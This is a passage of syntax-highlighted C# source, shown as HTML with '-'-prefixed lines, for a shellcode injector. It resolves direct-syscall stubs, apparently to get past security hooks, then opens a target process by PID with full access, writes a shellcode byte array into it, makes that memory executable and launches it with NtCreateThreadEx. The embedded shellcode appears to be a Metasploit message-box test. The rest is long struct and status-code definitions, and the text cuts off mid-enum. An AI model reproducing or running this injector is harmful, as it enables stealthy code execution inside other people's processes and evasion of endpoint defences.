-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x5e,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xec,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>x5d,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xc7,<span style="color:#ae81ff">0</span>xc1,
-            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8d,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x1a,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x8d,
-            <span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x2b,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>xff,
-            <span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>x2a,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>xbd,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc4,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x06,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>xfb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x05,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x47,<span style="color:#ae81ff">0</span>x13,
-            <span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6a,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6f,
-            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x53,<span style="color:#ae81ff">0</span>x46,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x73,
-            <span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x67,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x78,<span style="color:#ae81ff">0</span>x00 };
-
-    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
-    {
-        <span style="color:#75715e">// NtOpenProcess
-</span><span style="color:#75715e"></span>        IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
-        NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
-
-        IntPtr hProcess = IntPtr.Zero;
-        OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();
-
-        CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
-        {
-            UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
-        };
-
-        NTSTATUS result = ntOpenProcess(
-            <span style="color:#66d9ef">ref</span> hProcess,
-            <span style="color:#ae81ff">0</span>x001F0FFF,
-            <span style="color:#66d9ef">ref</span> oa,
-            <span style="color:#66d9ef">ref</span> ci);
-
-        <span style="color:#75715e">// NtAllocateVirtualMemory
-</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
-        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtAllocateVirtualMemory));
-
-        IntPtr baseAddress = IntPtr.Zero;
-        IntPtr regionSize = (IntPtr)_shellcode.Length;
-
-        result = ntAllocateVirtualMemory(
-            hProcess,
-            <span style="color:#66d9ef">ref</span> baseAddress,
-            IntPtr.Zero,
-            <span style="color:#66d9ef">ref</span> regionSize,
-            <span style="color:#ae81ff">0</span>x1000 | <span style="color:#ae81ff">0</span>x2000,
-            <span style="color:#ae81ff">0</span>x04);
-
-        <span style="color:#75715e">// NtWriteVirtualMemory
-</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtWriteVirtualMemory&#34;</span>);
-        NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtWriteVirtualMemory));
-
-        <span style="color:#66d9ef">var</span> buffer = Marshal.AllocHGlobal(_shellcode.Length);
-        Marshal.Copy(_shellcode, <span style="color:#ae81ff">0</span>, buffer, _shellcode.Length);
-
-        <span style="color:#66d9ef">uint</span> bytesWritten = <span style="color:#ae81ff">0</span>;
-
-        result = ntWriteVirtualMemory(
-            hProcess,
-            baseAddress,
-            buffer,
-            (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
-            <span style="color:#66d9ef">ref</span> bytesWritten);
-
-        <span style="color:#75715e">// NtProtectVirtualMemory
-</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtProtectVirtualMemory&#34;</span>);
-        NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtProtectVirtualMemory));
-
-        <span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;
-
-        result = ntProtectVirtualMemory(
-            hProcess,
-            <span style="color:#66d9ef">ref</span> baseAddress,
-            <span style="color:#66d9ef">ref</span> regionSize,
-            <span style="color:#ae81ff">0</span>x20,
-            <span style="color:#66d9ef">ref</span> oldProtect);
-
-        <span style="color:#75715e">// NtCreateThreadEx
-</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtCreateThreadEx&#34;</span>);
-        NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtCreateThreadEx));
-
-        IntPtr hThread = IntPtr.Zero;
-
-        result = ntCreateThreadEx(
-            <span style="color:#66d9ef">out</span> hThread,
-            ACCESS_MASK.MAXIMUM_ALLOWED,
-            IntPtr.Zero,
-            hProcess,
-            baseAddress,
-            IntPtr.Zero,
-            <span style="color:#66d9ef">false</span>,
-            <span style="color:#ae81ff">0</span>,
-            <span style="color:#ae81ff">0</span>,
-            <span style="color:#ae81ff">0</span>,
-            IntPtr.Zero);
-        }
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-        <span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
-            <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
-            <span style="color:#66d9ef">uint</span> DesiredAccess,
-            <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
-            <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-        <span style="color:#66d9ef">delegate</span> NTSTATUS NtAllocateVirtualMemory(
-            IntPtr ProcessHandle,
-            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
-            IntPtr ZeroBits,
-            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
-            <span style="color:#66d9ef">uint</span> AllocationType,
-            <span style="color:#66d9ef">uint</span> Protect);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-        <span style="color:#66d9ef">delegate</span> NTSTATUS NtWriteVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            <span style="color:#66d9ef">uint</span> BufferLength,
-            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> BytesWritten);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-        <span style="color:#66d9ef">delegate</span> NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
-            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
-            <span style="color:#66d9ef">uint</span> NewProtect,
-            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> OldProtect);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-        <span style="color:#66d9ef">delegate</span> NTSTATUS NtCreateThreadEx(
-            <span style="color:#66d9ef">out</span> IntPtr threadHandle,
-            ACCESS_MASK desiredAccess,
-            IntPtr objectAttributes,
-            IntPtr processHandle,
-            IntPtr startAddress,
-            IntPtr parameter,
-            <span style="color:#66d9ef">bool</span> createSuspended,
-            <span style="color:#66d9ef">int</span> stackZeroBits,
-            <span style="color:#66d9ef">int</span> sizeOfStack,
-            <span style="color:#66d9ef">int</span> maximumStackSize,
-            IntPtr attributeList);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
-        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
-        {
-            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
-            <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
-            <span style="color:#66d9ef">public</span> IntPtr ObjectName;
-            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
-            <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
-            <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
-        }
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span>
-        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
-        {
-            <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
-            <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
-        }
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [Flags]</span>
-        <span style="color:#66d9ef">enum</span> ACCESS_MASK : <span style="color:#66d9ef">uint</span>
-        {
-            DELETE = <span style="color:#ae81ff">0</span>x00010000,
-            READ_CONTROL = <span style="color:#ae81ff">0</span>x00020000,
-            WRITE_DAC = <span style="color:#ae81ff">0</span>x00040000,
-            WRITE_OWNER = <span style="color:#ae81ff">0</span>x00080000,
-            SYNCHRONIZE = <span style="color:#ae81ff">0</span>x00100000,
-            STANDARD_RIGHTS_REQUIRED = <span style="color:#ae81ff">0</span>x000F0000,
-            STANDARD_RIGHTS_READ = <span style="color:#ae81ff">0</span>x00020000,
-            STANDARD_RIGHTS_WRITE = <span style="color:#ae81ff">0</span>x00020000,
-            STANDARD_RIGHTS_EXECUTE = <span style="color:#ae81ff">0</span>x00020000,
-            STANDARD_RIGHTS_ALL = <span style="color:#ae81ff">0</span>x001F0000,
-            SPECIFIC_RIGHTS_ALL = <span style="color:#ae81ff">0</span>x0000FFF,
-            ACCESS_SYSTEM_SECURITY = <span style="color:#ae81ff">0</span>x01000000,
-            MAXIMUM_ALLOWED = <span style="color:#ae81ff">0</span>x02000000,
-            GENERIC_READ = <span style="color:#ae81ff">0</span>x80000000,
-            GENERIC_WRITE = <span style="color:#ae81ff">0</span>x40000000,
-            GENERIC_EXECUTE = <span style="color:#ae81ff">0</span>x20000000,
-            GENERIC_ALL = <span style="color:#ae81ff">0</span>x10000000,
-            DESKTOP_READOBJECTS = <span style="color:#ae81ff">0</span>x00000001,
-            DESKTOP_CREATEWINDOW = <span style="color:#ae81ff">0</span>x00000002,
-            DESKTOP_CREATEMENU = <span style="color:#ae81ff">0</span>x00000004,
-            DESKTOP_HOOKCONTROL = <span style="color:#ae81ff">0</span>x00000008,
-            DESKTOP_JOURNALRECORD = <span style="color:#ae81ff">0</span>x00000010,
-            DESKTOP_JOURNALPLAYBACK = <span style="color:#ae81ff">0</span>x00000020,
-            DESKTOP_ENUMERATE = <span style="color:#ae81ff">0</span>x00000040,
-            DESKTOP_WRITEOBJECTS = <span style="color:#ae81ff">0</span>x00000080,
-            DESKTOP_SWITCHDESKTOP = <span style="color:#ae81ff">0</span>x00000100,
-            WINSTA_ENUMDESKTOPS = <span style="color:#ae81ff">0</span>x00000001,
-            WINSTA_READATTRIBUTES = <span style="color:#ae81ff">0</span>x00000002,
-            WINSTA_ACCESSCLIPBOARD = <span style="color:#ae81ff">0</span>x00000004,
-            WINSTA_CREATEDESKTOP = <span style="color:#ae81ff">0</span>x00000008,
-            WINSTA_WRITEATTRIBUTES = <span style="color:#ae81ff">0</span>x00000010,
-            WINSTA_ACCESSGLOBALATOMS = <span style="color:#ae81ff">0</span>x00000020,
-            WINSTA_EXITWINDOWS = <span style="color:#ae81ff">0</span>x00000040,
-            WINSTA_ENUMERATE = <span style="color:#ae81ff">0</span>x00000100,
-            WINSTA_READSCREEN = <span style="color:#ae81ff">0</span>x00000200,
-            WINSTA_ALL_ACCESS = <span style="color:#ae81ff">0</span>x0000037F,
-
-            SECTION_ALL_ACCESS = <span style="color:#ae81ff">0</span>x10000000,
-            SECTION_QUERY = <span style="color:#ae81ff">0</span>x0001,
-            SECTION_MAP_WRITE = <span style="color:#ae81ff">0</span>x0002,
-            SECTION_MAP_READ = <span style="color:#ae81ff">0</span>x0004,
-            SECTION_MAP_EXECUTE = <span style="color:#ae81ff">0</span>x0008,
-            SECTION_EXTEND_SIZE = <span style="color:#ae81ff">0</span>x0010
-        };
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [Flags]</span>
-        <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
-        {
-            <span style="color:#75715e">// Success
-</span><span style="color:#75715e"></span>            Success = <span style="color:#ae81ff">0</span>x00000000,
-            Wait0 = <span style="color:#ae81ff">0</span>x00000000,
-            Wait1 = <span style="color:#ae81ff">0</span>x00000001,
-            Wait2 = <span style="color:#ae81ff">0</span>x00000002,
-            Wait3 = <span style="color:#ae81ff">0</span>x00000003,
-            Wait63 = <span style="color:#ae81ff">0</span>x0000003f,
-            Abandoned = <span style="color:#ae81ff">0</span>x00000080,
-            AbandonedWait0 = <span style="color:#ae81ff">0</span>x00000080,
-            AbandonedWait1 = <span style="color:#ae81ff">0</span>x00000081,
-            AbandonedWait2 = <span style="color:#ae81ff">0</span>x00000082,
-            AbandonedWait3 = <span style="color:#ae81ff">0</span>x00000083,
-            AbandonedWait63 = <span style="color:#ae81ff">0</span>x000000bf,
-            UserApc = <span style="color:#ae81ff">0</span>x000000c0,
-            KernelApc = <span style="color:#ae81ff">0</span>x00000100,
-            Alerted = <span style="color:#ae81ff">0</span>x00000101,
-            Timeout = <span style="color:#ae81ff">0</span>x00000102,
-            Pending = <span style="color:#ae81ff">0</span>x00000103,
-            Reparse = <span style="color:#ae81ff">0</span>x00000104,
-            MoreEntries = <span style="color:#ae81ff">0</span>x00000105,
-            NotAllAssigned = <span style="color:#ae81ff">0</span>x00000106,
-            SomeNotMapped = <span style="color:#ae81ff">0</span>x00000107,
-            OpLockBreakInProgress = <span style="color:#ae81ff">0</span>x00000108,
-            VolumeMounted = <span style="color:#ae81ff">0</span>x00000109,
-            RxActCommitted = <span style="color:#ae81ff">0</span>x0000010a,
-            NotifyCleanup = <span style="color:#ae81ff">0</span>x0000010b,
-            NotifyEnumDir = <span style="color:#ae81ff">0</span>x0000010c,
-            NoQuotasForAccount = <span style="color:#ae81ff">0</span>x0000010d,
-            PrimaryTransportConnectFailed = <span style="color:#ae81ff">0</span>x0000010e,
-            PageFaultTransition = <span style="color:#ae81ff">0</span>x00000110,
-            PageFaultDemandZero = <span style="color:#ae81ff">0</span>x00000111,
-            PageFaultCopyOnWrite = <span style="color:#ae81ff">0</span>x00000112,
-            PageFaultGuardPage = <span style="color:#ae81ff">0</span>x00000113,
-            PageFaultPagingFile = <span style="color:#ae81ff">0</span>x00000114,
-            CrashDump = <span style="color:#ae81ff">0</span>x00000116,
-            ReparseObject = <span style="color:#ae81ff">0</span>x00000118,
-            NothingToTerminate = <span style="color:#ae81ff">0</span>x00000122,
-            ProcessNotInJob = <span style="color:#ae81ff">0</span>x00000123,
-            ProcessInJob = <span style="color:#ae81ff">0</span>x00000124,
-            ProcessCloned = <span style="color:#ae81ff">0</span>x00000129,
-            FileLockedWithOnlyReaders = <span style="color:#ae81ff">0</span>x0000012a,
-            FileLockedWithWriters = <span style="color:#ae81ff">0</span>x0000012b,
-
-            <span style="color:#75715e">// Informational
-</span><span style="color:#75715e"></span>            Informational = <span style="color:#ae81ff">0</span>x40000000,
-            ObjectNameExists = <span style="color:#ae81ff">0</span>x40000000,
-            ThreadWasSuspended = <span style="color:#ae81ff">0</span>x40000001,
-            WorkingSetLimitRange = <span style="color:#ae81ff">0</span>x40000002,
-            ImageNotAtBase = <span style="color:#ae81ff">0</span>x40000003,
-            RegistryRecovered = <span style="color:#ae81ff">0</span>x40000009,
-
-            <span style="color:#75715e">// Warning
-</span><span style="color:#75715e"></span>            Warning = <span style="color:#ae81ff">0</span>x80000000,
-            GuardPageViolation = <span style="color:#ae81ff">0</span>x80000001,
-            DatatypeMisalignment = <span style="color:#ae81ff">0</span>x80000002,
-            Breakpoint = <span style="color:#ae81ff">0</span>x80000003,
-            SingleStep = <span style="color:#ae81ff">0</span>x80000004,
-            BufferOverflow = <span style="color:#ae81ff">0</span>x80000005,
-            NoMoreFiles = <span style="color:#ae81ff">0</span>x80000006,
-            HandlesClosed = <span style="color:#ae81ff">0</span>x8000000a,
-            PartialCopy = <span style="color:#ae81ff">0</span>x8000000d,
-            DeviceBusy = <span style="color:#ae81ff">0</span>x80000011,
-            InvalidEaName = <span style="color:#ae81ff">0</span>x80000013,
-            EaListInconsistent = <span style="color:#ae81ff">0</span>x80000014,
-            NoMoreEntries = <span style="color:#ae81ff">0</span>x8000001a,
-            LongJump = <span style="color:#ae81ff">0</span>x80000026,
-            DllMightBeInsecure = <span style="color:#ae81ff">0</span>x8000002b,
-
-            <span style="color:#75715e">// Error
-</span><span style="color:#75715e"></span>            Error = <span style="color:#ae81ff">0</span>xc0000000,
-            Unsuccessful = <span style="color:#ae81ff">0</span>xc0000001,
-            NotImplemented = <span style="color:#ae81ff">0</span>xc0000002,
-            InvalidInfoClass = <span style="color:#ae81ff">0</span>xc0000003,
-            InfoLengthMismatch = <span style="color:#ae81ff">0</span>xc0000004,
-            AccessViolation = <span style="color:#ae81ff">0</span>xc0000005,
-            InPageError = <span style="color:#ae81ff">0</span>xc0000006,
-            PagefileQuota = <span style="color:#ae81ff">0</span>xc0000007,
-            InvalidHandle = <span style="color:#ae81ff">0</span>xc0000008,
-            BadInitialStack = <span style="color:#ae81ff">0</span>xc0000009,
-            BadInitialPc = <span style="color:#ae81ff">0</span>xc000000a,
-            InvalidCid = <span style="color:#ae81ff">0</span>xc000000b,
-            TimerNotCanceled = <span style="color:#ae81ff">0</span>xc000000c,
-            InvalidParameter = <span style="color:#ae81ff">0</span>xc000000d,
-            NoSuchDevice = <span style="color:#ae81ff">0</span>xc000000e,
-            NoSuchFile = <span style="color:#ae81ff">0</span>xc000000f,
-            InvalidDeviceRequest = <span style="color:#ae81ff">0</span>xc0000010,
-            EndOfFile = <span style="color:#ae81ff">0</span>xc0000011,
-            WrongVolume = <span style="color:#ae81ff">0</span>xc0000012,
-            NoMediaInDevice = <span style="color:#ae81ff">0</span>xc0000013,
-            NoMemory = <span style="color:#ae81ff">0</span>xc0000017,
-            ConflictingAddresses = <span style="color:#ae81ff">0</span>xc0000018,
-            NotMappedView = <span style="color:#ae81ff">0</span>xc0000019,
-            UnableToFreeVm = <span style="color:#ae81ff">0</span>xc000001a,
-            UnableToDeleteSection = <span style="color:#ae81ff">0</span>xc000001b,
-            IllegalInstruction = <span style="color:#ae81ff">0</span>xc000001d,
-            AlreadyCommitted = <span style="color:#ae81ff">0</span>xc0000021,
-            AccessDenied = <span style="color:#ae81ff">0</span>xc0000022,
-            BufferTooSmall = <span style="color:#ae81ff">0</span>xc0000023,
-            ObjectTypeMismatch = <span style="color:#ae81ff">0</span>xc0000024,
-            NonContinuableException = <span style="color:#ae81ff">0</span>xc0000025,
-            BadStack = <span style="color:#ae81ff">0</span>xc0000028,
-            NotLocked = <span style="color:#ae81ff">0</span>xc000002a,
-            NotCommitted = <span style="color:#ae81ff">0</span>xc000002d,
-            InvalidParameterMix = <span style="color:#ae81ff">0</span>xc0000030,
-            ObjectNameInvalid = <span style="color:#ae81ff">0</span>xc0000033,
-            ObjectNameNotFound = <span style="color:#ae81ff">0</span>xc0000034,
-            ObjectNameCollision = <span style="color:#ae81ff">0</span>xc0000035,
-            ObjectPathInvalid = <span style="color:#ae81ff">0</span>xc0000039,
-            ObjectPathNotFound = <span style="color:#ae81ff">0</span>xc000003a,
-            ObjectPathSyntaxBad = <span style="color:#ae81ff">0</span>xc000003b,
-            DataOverrun = <span style="color:#ae81ff">0</span>xc000003c,
-            DataLate = <span style="color:#ae81ff">0</span>xc000003d,
-            DataError = <span style="color:#ae81ff">0</span>xc000003e,
-            CrcError = <span style="color:#ae81ff">0</span>xc000003f,
-            SectionTooBig = <span style="color:#ae81ff">0</span>xc0000040,
-            PortConnectionRefused = <span style="color:#ae81ff">0</span>xc0000041,
-            InvalidPortHandle = <span style="color:#ae81ff">0</span>xc0000042,
-            SharingViolation = <span style="color:#ae81ff">0</span>xc0000043,
-            QuotaExceeded = <span style="color:#ae81ff">0</span>xc0000044,
-            InvalidPageProtection = <span style="color:#ae81ff">0</span>xc0000045,
-            MutantNotOwned = <span style="color:#ae81ff">0</span>xc0000046,
-            SemaphoreLimitExceeded = <span style="color:#ae81ff">0</span>xc0000047,
-            PortAlreadySet = <span style="color:#ae81ff">0</span>xc0000048,
-            SectionNotImage = <span style="color:#ae81ff">0</span>xc0000049,
-            SuspendCountExceeded = <span style="color:#ae81ff">0</span>xc000004a,
-            ThreadIsTerminating = <span style="color:#ae81ff">0</span>xc000004b,
-            BadWorkingSetLimit = <span style="color:#ae81ff">0</span>xc000004c,
-            IncompatibleFileMap = <span style="color:#ae81ff">0</span>xc000004d,
-            SectionProtection = <span style="color:#ae81ff">0</span>xc000004e,
-            EasNotSupported = <span style="color:#ae81ff">0</span>xc000004f,
-            EaTooLarge = <span style="color:#ae81ff">0</span>xc0000050,
-            NonExistentEaEntry = <span style="color:#ae81ff">0</span>xc0000051,
-            NoEasOnFile = <span style="color:#ae81ff">0</span>xc0000052,
-            EaCorruptError = <span style="color:#ae81ff">0</span>xc0000053,
-            FileLockConflict = <span style="color:#ae81ff">0</span>xc0000054,
-            LockNotGranted = <span style="color:#ae81ff">0</span>xc0000055,
-            DeletePending = <span style="color:#ae81ff">0</span>xc0000056,
-            CtlFileNotSupported = <span style="color:#ae81ff">0</span>xc0000057,
-            UnknownRevision = <span style="color:#ae81ff">0</span>xc0000058,
-            RevisionMismatch = <span style="color:#ae81ff">0</span>xc0000059,
-            InvalidOwner = <span style="color:#ae81ff">0</span>xc000005a,
-            InvalidPrimaryGroup = <span style="color:#ae81ff">0</span>xc000005b,
-            NoImpersonationToken = <span style="color:#ae81ff">0</span>xc000005c,
-            CantDisableMandatory = <span style="color:#ae81ff">0</span>xc000005d,
-            NoLogonServers = <span style="color:#ae81ff">0</span>xc000005e,
-            NoSuchLogonSession = <span style="color:#ae81ff">0</span>xc000005f,
-            NoSuchPrivilege = <span style="color:#ae81ff">0</span>xc0000060,
-            PrivilegeNotHeld = <span style="color:#ae81ff">0</span>xc0000061,
-            InvalidAccountName = <span style="color:#ae81ff">0</span>xc0000062,
-            UserExists = <span style="color:#ae81ff">0</span>xc0000063,
-            NoSuchUser = <span style="color:#ae81ff">0</span>xc0000064,
-            GroupExists = <span style="color:#ae81ff">0</span>xc0000065,
-            NoSuchGroup = <span style="color:#ae81ff">0</span>xc0000066,
-            MemberInGroup = <span style="color:#ae81ff">0</span>xc0000067,
-            MemberNotInGroup = <span style="color:#ae81ff">0</span>xc0000068,
-            LastAdmin = <span style="color:#ae81ff">0</span>xc0000069,
-            WrongPassword = <span style="color:#ae81ff">0</span>xc000006a,
-            IllFormedPassword = <span style="color:#ae81ff">0</span>xc000006b,
-            PasswordRestriction = <span style="color:#ae81ff">0</span>xc000006c,
-            LogonFailure = <span style="color:#ae81ff">0</span>xc000006d,
-            AccountRestriction = <span style="color:#ae81ff">0</span>xc000006e,
-            InvalidLogonHours = <span style="color:#ae81ff">0</span>xc000006f,
-            InvalidWorkstation = <span style="color:#ae81ff">0</span>xc0000070,
-            PasswordExpired = <span style="color:#ae81ff">0</span>xc0000071,
-            AccountDisabled = <span style="color:#ae81ff">0</span>xc0000072,
-            NoneMapped = <span style="color:#ae81ff">0</span>xc0000073,
-            TooManyLuidsRequested = <span style="color:#ae81ff">0</span>xc0000074,
-            LuidsExhausted = <span style="color:#ae81ff">0</span>xc0000075,
-            InvalidSubAuthority = <span style="color:#ae81ff">0</span>xc0000076,
-            InvalidAcl = <span style="color:#ae81ff">0</span>xc0000077,
-            InvalidSid = <span style="color:#ae81ff">0</span>xc0000078,
-            InvalidSecurityDescr = <span style="color:#ae81ff">0</span>xc0000079,
-            ProcedureNotFound = <span style="color:#ae81ff">0</span>xc000007a,
-            InvalidImageFormat = <span style="color:#ae81ff">0</span>xc000007b,
-            NoToken = <span style="color:#ae81ff">0</span>xc000007c,
-            BadInheritanceAcl = <span style="color:#ae81ff">0</span>xc000007d,
-            RangeNotLocked = <span style="color:#ae81ff">0</span>xc000007e,
-            DiskFull = <span style="color:#ae81ff">0</span>xc000007f,
-            ServerDisabled = <span style="color:#ae81ff">0</span>xc0000080,
-            ServerNotDisabled = <span style="color:#ae81ff">0</span>xc0000081,
-            TooManyGuidsRequested = <span style="color:#ae81ff">0</span>xc0000082,
